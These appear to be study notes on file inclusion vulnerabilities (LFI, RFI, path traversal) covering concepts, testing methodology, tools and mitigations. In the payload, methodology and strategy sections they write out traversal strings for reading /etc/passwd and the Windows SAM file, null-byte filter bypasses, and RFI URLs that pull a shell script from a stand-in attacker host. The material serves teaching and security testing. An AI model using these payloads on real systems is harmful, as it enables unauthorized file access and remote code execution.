## üîí **High-Level Summary: File Inclusion Vulnerabilities**

**_File Inclusion Vulnerabilities_** occur when applications improperly handle user input to include files dynamically. This can lead to severe consequences like **information disclosure**, **remote code execution**, or **privilege escalation**. File inclusion vulnerabilities arise due to poor input validation, lack of access controls, and improper path handling. These vulnerabilities are categorized into:

- **_Local File Inclusion (LFI)_**: Including files already present on the server.
- **_Remote File Inclusion (RFI)_**: Including files from external sources via URLs.
- **_Path Traversal_**: Accessing files outside the intended directory by manipulating paths.

| **File Inclusion**              | A mechanism for including files into a main script, often using directives like `include` or `require`.       | Including configuration files or templates dynamically in PHP or Python.           |
| **Local File Inclusion (LFI)**  | Exploiting a file inclusion vulnerability to include files already on the server.                             | Reading `/etc/passwd` via path manipulation in Unix-based systems.                 |
| **Remote File Inclusion (RFI)** | Exploiting a file inclusion vulnerability to include files from external sources via URLs.                    | Including a malicious script hosted on an attacker-controlled server.              |
| **Path Traversal**              | A vulnerability where attackers manipulate paths to access unauthorized files outside the intended directory. | Using `../../../../etc/passwd` to traverse directories and access sensitive files. |
| **Absolute Path**               | A full path to a file or directory from the root of the filesystem.                                           | `/var/www/html/config.php`.                                                        |

## üìù **Understanding Key Concepts**

### **File Inclusion in Modular Design**

Modern applications are often modular to improve maintainability and scalability. This means:

- Applications are broken into components based on functionality (e.g., configurations, templates).
- Files are dynamically included using mechanisms like `include` (PHP), `import` (Python), or `require` (Node.js).
- Example:
    
    ```php
    <?php
    include('header.php'); // Includes header module
    include($_GET['file']); // Dynamically includes a file based on user input
    ?>
    ```
    

---

### **How File Inclusion Vulnerabilities Occur**

1. **Improper Input Validation**:
    
    - **Problem**: When file paths are constructed using unsanitized user input.
    - **Effect**: Allows attackers to manipulate the input to include unintended files.
2. **Lack of Access Controls**:
    
    - **Problem**: Absence of proper restrictions on directories or file access.
    - **Effect**: Attackers can access sensitive files like configurations or logs.

---

### **Categories of File Inclusion Vulnerabilities**

#### **Local File Inclusion (LFI)**

- **What it is**: Exploiting the inclusion mechanism to load files already on the server.
- **Impact**:
    - **Information Disclosure**: Reading sensitive files like `/etc/passwd`.
    - **Server-Side Code Execution**: Including log files containing malicious payloads.
    - **Privilege Escalation**: Accessing configuration files with admin credentials.

**Example Payload**:

```php
http://example.com/index.php?file=../../../../etc/passwd
```

**Why it works**:

- The `file` parameter is used to include files without validation.
- Using `../` (path traversal), the attacker navigates to `/etc/passwd`.
- Works also because the idea is that the root directory is an etc folder, so we can add as many ../ as we can to get to the etc folder which will have access to the passwd if it exists.

#### **Remote File Inclusion (RFI)**

- **What it is**: Exploiting the inclusion mechanism to load files from external URLs.
- **Impact**:
    - **Remote Code Execution**: Running attacker-hosted malicious scripts.
    - **Data Theft**: Exposing sensitive application data to attackers.

**Example Payload**:

```php
http://example.com/index.php?file=http://malicious.com/shell.php
```

**Why it works**:

- The application allows URL-based file inclusion without validation.
- The malicious script hosted at `malicious.com` is included and executed.

---

#### **Path Traversal**

- **What it is**: Manipulating file paths to access files outside the intended directory.
- **Impact**:
    - **Information Disclosure**: Reading files like `config.php` or `/etc/passwd`.
    - **Access Control Bypass**: Navigating outside restricted directories.

**Example Payloads**:

```plaintext
../../../../etc/passwd
..\\..\\..\\..\\windows\\system32\\config\\SAM
```

## üìù **Methodology: Testing File Inclusion Vulnerabilities**

1. **Identify Input Points**:
    
    - Look for user-controlled parameters influencing file paths (e.g., `?file=` or `?template=`).
2. **Test for LFI**:
    
    - Inject payloads like `../../../../etc/passwd` and observe if the file contents are displayed.
3. **Test for RFI**:
    
    - Inject URLs like `http://malicious.com/shell.php` to see if external files are included.
4. **Test for Path Traversal**:
    
    - Use directory traversal sequences (`../` or `..\\`) to navigate outside intended directories.
5. **Verify Success**:
    
    - Check if sensitive files or errors are exposed.

## üìù **Strategies for Identifying File Inclusion Vulnerabilities**

1. **Testing With Path Traversal**
    
    - Use common payloads like:
        
        plaintext
        
        Copy code
        
        `../../etc/passwd ../../../../windows/system32/drivers/etc/hosts`
        
    - Observe for:
        - Partial file content.
        - Behavioral changes.
2. **Using Common File Inclusion Payloads**
    
    - Try including files likely to exist on the server:
        - Logs: `../../var/log/apache/access.log`
        - Configs: `../../config.php`
    - Test varying path depths (`../`) to adjust for directory structures.
3. **Probing for Extensions**
    
    - Applications may expect specific file types:
        - Add extensions: `.php`, `.txt`, `.log`.
        - Use null byte terminators (`%00`) to bypass filters:
            
            bash
            
            Copy code
            
            `../../etc/passwd%00`
            
4. **Testing for Remote File Inclusion (RFI)**
    
    - If URLs are allowed, try including remote scripts:
        
        arduino
        
        Copy code
        
        `http://malicious.example.com/shell.txt`
        
    - Check if the file is executed or included in the response.
5. **Checking for Extension Filters**
    
    - Some applications whitelist or blacklist extensions:
        - Test bypasses with double extensions: `file.php.txt`.
6. **Monitoring Responses and Logs**
    
    - Observe changes in page layout or behavior.
    - Look for clues in server logs (if accessible).

## üìù **Red Flags in Source Code**

1. **Dynamic Includes**:
    
    - Example:
        
        php
        
        Copy code
        
        `include($_GET['page']);   require($_POST['file']);`  
        
2. **User-Controlled Input in File Paths**:
    
    - Concatenating user input with file paths:
        
        php
        
        Copy code
        
        `$file = $_GET['file']; include("/templates/" . $file);`
        
3. **Lack of Sanitization**:
    
    - No validation or restrictions on user input.

## üìù **Tools for File Inclusion Testing**

1. **Burp Suite**
    
    - Use extensions like **Param Miner** for parameter fuzzing.
2. **ffuf/DirBuster**
    
    - Discover accessible files and directories.
3. **Intruder Modules**
    
    - Automate testing for traversal sequences and file inclusion payloads.

## ‚úÖ **Actionable Insights**

1. **_Sanitize User Input_**:
    
    - Reject directory traversal sequences (`../`, `..\\`) and URLs.
    - Use built-in functions like `basename()` to restrict paths.
2. **_Implement Access Controls_**:
    
    - Restrict file access to specific directories using `open_basedir` in PHP or similar mechanisms.
3. **_Use Secure Inclusion Methods_**:
    
    - Avoid dynamic inclusion when possible. Use hardcoded file paths or whitelisted inputs.
4. **_Log Suspicious Activity_**:
    
    - Monitor and analyze logs for unusual file inclusion attempts or access patterns.
